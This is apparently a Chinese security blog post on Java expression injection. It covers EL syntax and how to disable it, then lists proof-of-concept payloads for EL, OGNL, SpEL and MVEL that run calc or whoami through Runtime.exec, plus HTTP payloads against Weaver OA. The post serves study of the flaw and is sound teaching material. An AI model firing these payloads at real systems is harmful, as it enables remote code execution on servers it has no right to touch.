---
title: "Java 表达式注入"
date: 2020-05-08T11:40:36+08:00
draft: false
tags:
- java
- EL表达式
series:
-
categories:
- 代码审计
---

jsp常用
<!--more-->

## 简介
Java中表达式根据框架分为好多种，其中EL表达式是jsp的内置语音，是为了让jsp写起来更简单而出现的，其设计思想来源自`ECMAScript`和`XPath`。使用EL表达式我们可以在jsp页面中执行运算、获取数据、调用方法、获取对象等操作。其基本语法为`${变量表达式}`。

## 基本语法
大部分的语法都和jsp差不多，说下不太一样的。

### 获取变量

```java
<%@ page import="java.util.HashMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String name = "张三";
    request.setAttribute("name",name);

    request.setAttribute("request", "request_name");
    session.setAttribute("session", "session_name");
    pageContext.setAttribute("page", "page_name");
    application.setAttribute("application", "application_name");
    HashMap<String, String> map = new HashMap<>();
    map.put("my-name", "admin");
    request.setAttribute("test", map);
%>
从四个作用域中搜索变量：${name}
</br>
<%--获取作用域--%>
从requestScope作用域中获取变量：${requestScope.request}
</br>
从sessionScope作用域中获取变量：${sessionScope.session}
</br>
从pageScope作用域中获取变量：${pageScope.page}
</br>
从applicationScope作用域中获取变量：${applicationScope.application}
</br>
从作用域中获取特殊符号变量：${requestScope.test["my-name"]}
```
### 操作符

|  类型  | 符号                                                         |
| :----: | ------------------------------------------------------------ |
| 算术型 | +、-（二元）、`*`、/、div、%、mod、-（一元）     |
| 逻辑型 | and、&&、or、双管道符、!、not                                |
| 关系型 | ==、eq、!=、ne、<、lt、>、gt、<=、le、>=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 |
|   空   | empty 空操作符是前缀操作，可用于确定值是否为空。             |
| 条件型 | A ?B :C。根据 A 赋值的结果来赋值 B 或 C。                    |

### 隐式对象
1. pageContext
2. param paramValues
3. header headerValues
4. cookie
5. initParam
6. Scope系列

### 函数

```java
${ns:func(param1, param2, ...)}
```
用el表达式调用函数必须使用`taglib`引入你的标签库

### 调用Java方法

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@taglib prefix="elFunc" uri="http://www.test.com/elFunc" %>
<%
    String name = "张三";
    request.setAttribute("name",name);
%>
调用函数：${elFunc:elFunc(name)}
```
页面输出 `调用函数：hello 张三`

### 禁用/启用EL表达式
全局禁用EL表达式，web.xml中进入如下配置：

```xml
<jsp-config>
    <jsp-property-group>
        <url-pattern>*.jsp</url-pattern>
        <el-ignored>true</el-ignored>
    </jsp-property-group>
</jsp-config>
```
单个文件禁用EL表达式
在JSP文件中可以有如下定义：

```java
<%@ page isELIgnored="true" %>
```
该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。

JSP2.0中默认的启用EL表达式。


## 表达式注入漏洞实例
原理都是一样的：表达式全部或部份外部可控。先列一些通用的poc，然后按照不同框架简单划分下。

### 通用POC

```java
${pageContext}
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}
${header}
${applicationScope}
${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}
```

### Struts2 OGNL
```txt
@[类全名（包括包路径）]@[方法名 |  值名]，例如：
@java.lang.String@format('foo %s', 'bar')
```

实例代码

```java
ActionContext AC = ActionContext.getContext();
String expression = "${(new java.lang.ProcessBuilder('calc')).start()}";
AC.getValueStack().findValue(expression));
```

### Spring SPEL

```java
String expression = "T(java.lang.Runtime).getRuntime().exec(/"calc/")";
String result = parser.parseExpression(expression).getValue().toString();
```

### JSP JSTL_EL

```java
<spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
</spring:message>
```

### Elasticsearch MVEL

```java
String expression = "new java.lang.ProcessBuilder(/"calc/").start();";  
Boolean result = (Boolean) MVEL.eval(expression, vars);
```

### 泛微OA EL表达式注入

```java
login.do?message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())
```
或者POST

```java
message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
```

还有一种

```http
POST /weaver/bsh.servlet.BshServlet
bsh.script=eval%00("ex"%2b"ec(\\"cmd+/c+calc\\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
```

## 绕过
1. 反射
2. unicode
3. 八进制

## 参考
1. [泛微e-mobile ognl注入](https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md)
2. https://xz.aliyun.com/t/7692
3. https://www.jianshu.com/p/14e9af313e93
4. [表达式注入](https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/)


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**